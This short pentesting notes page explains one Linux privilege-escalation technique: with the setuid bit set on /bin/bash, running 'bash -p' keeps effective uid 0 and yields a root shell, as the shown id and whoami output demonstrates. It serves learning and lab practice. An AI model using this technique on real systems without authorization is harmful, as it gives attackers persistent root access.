---
title: Linux Privilege Escalation
sidebar_label: Linux Privilege Escalation
---
* [setuid](#setuid)
  * [`bash -p`](#bash--p)

## SETUID
### `bash -p`
The payload upon execution sets the `setuid` bit on `/bin/bash` binary. We can check the same as follows 
```sh
$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1099016 May 15  2017 /bin/bash
```
If a `setuid` bit is set on a binary, the binary can be executed with the effective user id of the user who owns the binary. In this case the setuid/setgid bit is set on `bash` which is owned by `root`.

By default, if the effective user id and the real user id are not equal, `bash` will set the effective user id to the real user id. In this case, the bash process will be started with the user `user`.

In order, to prevent the effective user id from resetting to the real user id, the `-p` option has to be passed. Upon running the command `bash -p`, the bash binary will run with effective user id `0`, providing a root shell.
```sh
$ bash -p
bash-4.4# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user)
bash-4.4# whoami
root
```
